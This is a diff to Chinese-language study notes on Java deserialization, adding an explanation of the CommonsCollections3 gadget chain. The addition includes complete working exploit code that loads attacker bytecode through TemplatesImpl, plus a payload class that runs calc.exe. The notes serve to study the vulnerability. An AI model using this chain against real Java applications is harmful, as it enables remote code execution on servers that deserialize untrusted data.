@@ -110,6 +110,7 @@ public class HelloDefineClass {
 * com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader重写了defineClass方法，修饰符default
 * 可以追溯的调用链，getOutputProperties()和newTransformer()是public
 * 多个反序列化利用链，以及fastjson、jackson的漏洞中，都曾出现过 TemplatesImpl 的身影
+* 被加载的类要求继承AbstractTranslet
 
 ```txt
 TemplatesImpl#getOutputProperties() -> TemplatesImpl#newTransformer() ->
@@ -281,3 +282,160 @@ public class TestCC3 {
 
 * 2015年初，@frohoff和@gebl发布了<a src=https://frohoff.github.io/appseccali-marshalling-pickles/>Talk《Marshalling Pickles: how deserializing objects will ruin your day》</a>，以及Java反序列化利⽤⼯具ysoserial，随后引爆了安全界。开发者们⾃然会去找寻⼀种安 全的过滤⽅法，于是类似<a href=https://github.com/ikkisoft/SerialKiller>SerialKiller</a>这样的⼯具随之诞⽣。
 * SerialKiller是⼀个Java反序列化过滤器，可以通过⿊名单与⽩名单的⽅式来限制反序列化时允许通过的类，在其发布的第⼀个版本代码中，其就限制了InvokerTransformer类
+* CC3没有使用InvokerTransformer类，而是通过`com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter`的构造方法（调用了(TransformerImpl)templates.newTransformer()）加载任意字节码，又通过`org.apache.commons.collections.functors.InstantiateTransformer`类调用前一个类的构造方法
+
+```java
+// TrAXFilter的构造方法
+// Templates是TemplatesImpl的父类
+public TrAXFilter(Templates templates)  throws
+        TransformerConfigurationException
+    {
+        _templates = templates;
+        _transformer = (TransformerImpl) templates.newTransformer();
+        _transformerHandler = new TransformerHandlerImpl(_transformer);
+        _useServicesMechanism = _transformer.useServicesMechnism();
+    }
+```
+
+```java
+// org.apache.commons.collections.functors.InstantiateTransformer实现了Transformer, Serializable接口
+// 它对于transform的实现
+public Object transform(Object input) {
+        try {
+            if (input instanceof Class == false) {
+                throw new FunctorException(
+                    "InstantiateTransformer: Input object was not an instanceof Class, it was a "
+                        + (input == null ? "null object" : input.getClass().getName()));
+            }
+            Constructor con = ((Class) input).getConstructor(iParamTypes);
+            return con.newInstance(iArgs);
+
+        } catch (NoSuchMethodException ex) {
+            throw new FunctorException("InstantiateTransformer: The constructor must exist and be public ");
+        } catch (InstantiationException ex) {
+            throw new FunctorException("InstantiateTransformer: InstantiationException", ex);
+        } catch (IllegalAccessException ex) {
+            throw new FunctorException("InstantiateTransformer: Constructor must be public", ex);
+        } catch (InvocationTargetException ex) {
+            throw new FunctorException("InstantiateTransformer: Constructor threw an exception", ex);
+        }
+    }
+```
+
+```java
+// CC3
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InstantiateTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+import javax.xml.transform.Templates;
+import java.io.*;
+import java.lang.annotation.Retention;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.Base64;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CommonsCollections3 {
+    public static void setFieldValue(Object obj, String fieldName, Object
+            value) throws Exception {
+        Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj, value);
+    }
+    public static String classFileToBase64(String filepath) throws IOException {
+        String classFilePath = filepath;
+        String base64String;
+        // 读取 class 文件的字节数组
+        byte[] classBytes = Files.readAllBytes(Paths.get(classFilePath));
+
+        // 将字节数组转换为 Base64 编码字符串
+        base64String= Base64.getEncoder().encodeToString(classBytes);
+
+        return base64String;
+    }
+    public static void main(String[] args) throws Exception {
+        String base64Code = classFileToBase64("your/class/path/CalcExample.class");
+        byte[] code =
+                Base64.getDecoder().decode(base64Code);
+        TemplatesImpl obj = new TemplatesImpl();
+        setFieldValue(obj, "_bytecodes", new byte[][] {code});
+        setFieldValue(obj, "_name", "CalcExample");
+        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
+        Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(TrAXFilter.class),
+                new InstantiateTransformer(
+                        new Class[] { Templates.class },
+                        new Object[] { obj })
+        };
+
+        Transformer transformerChain = new
+                ChainedTransformer(transformers);
+
+        Map innerMap = new HashMap();
+
+       
+        innerMap.put("value", "xxxx");
+       
+
+        Map outerMap = TransformedMap.decorate(innerMap, null,
+                transformerChain);
+        Class clazz =
+                Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
+        construct.setAccessible(true);
+        Object objSer = construct.newInstance(Retention.class, outerMap);
+
+        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(barr);
+        oos.writeObject(objSer);
+        oos.close();
+
+        System.out.println(barr);
+        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
+        Object o = ois.readObject();
+    }
+}
+```
+
+```java
+// CalcExample.java
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
+import java.io.IOException;
+
+public class CalcExample extends AbstractTranslet {
+    static{
+        try {
+            Process process = Runtime.getRuntime().exec("calc.exe");
+        } catch (IOException e) {
+            throw new RuntimeException(e);
+        }
+    }
+    public CalcExample(){
+        System.out.println("Calc Example");
+    }
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
+}
+```
+
